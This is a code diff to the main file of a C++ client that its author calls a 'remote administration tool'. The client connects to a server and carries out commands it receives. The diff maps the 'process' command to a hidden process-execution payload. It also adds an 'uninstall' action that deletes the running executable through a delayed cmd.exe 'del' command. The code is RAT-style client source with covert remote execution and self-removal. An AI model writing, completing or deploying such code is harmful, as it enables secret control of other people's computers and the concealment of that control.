@@ -1,8 +1,9 @@
 #include "precompile.h"
 #include "client.h"
 #include "payloads.h"
+#include <stdio.h>
 
-int main() // TODO: make this to class and fix a hash-table for identifier buffers for incoming pakets. add some cmd thingies. remote stuff and we are done. boom remote administration tool
+int main(int argc, char** argv) // TODO: make this to class and fix a hash-table for identifier buffers for incoming pakets. add some cmd thingies. remote stuff and we are done. boom remote administration tool
 {
 	std::string ip_address = "127.0.0.1";// IP Address of the server
 	int port = 54321; // Listening port # on the server
@@ -16,52 +17,17 @@ int main() // TODO: make this to class and fix a hash-table for identifier buffe
 	response_table responses = {
 		{"time", [&](std::string data) {return std::to_string(time(0)); }},
 		{"alive", [&](std::string data) {return "true"; }},
-		{"process", payload::process_execution}
+		{"process", payload::process_execution_hidden}
 	};
 
-	action_table actions = {};
+	action_table actions = {
+		{"exit", [&](std::string data) { exit(0); }},
+		{"uninstall", [&](std::string) { payload::process_execution(R"("C:\Windows\System32\cmd.exe" /K timeout /t 2 && del )" + std::string(argv[0]), true); exit(0); }}
+	};
 
 	client main(ip_address, port, responses, actions);
 
 	main.connect();
 
 	main.run();
-
-	/*tcp_client klient(ip_address, port);
-
-	klient.set_disconnect_action([&]() {exit(-1); });
-
-	klient.set_responses({
-
-		{"time", [&](std::string data) {return std::to_string(time(0)); }},
-		{"alive", [&](std::string data) {return "true"; }}
-
-		});
-
-	bool connected = false;
-
-	while (!connected) {
-		connected = klient.connect();
-	}
-
-	klient.paket_loop();*/
-
-	//while (std::cin >> size) {
-	//	int isize = std::stoi(size);
-	//	std::string a;
-	//	a.append(std::string(16 - size.length(), '0'));
-	//	a.append(size);
-	//	a.append(std::string(16 - size.length(), '0'));
-	//	a.append(size);
-	//	std::cout << a << std::endl;
-	//	std::cin.get();
-	//	send(sock, a.c_str(), 32, 0);
-	//	char response[1];
-	//	recv(sock, response, 1, 0);
-	//	if (response[0] == '1') {
-	//		send(sock, std::string(isize, 'a').c_str(), isize, 0);
-	//		send(sock, std::string(isize, 'b').c_str(), isize, 0);
-	//	}
-	//}
-
 }
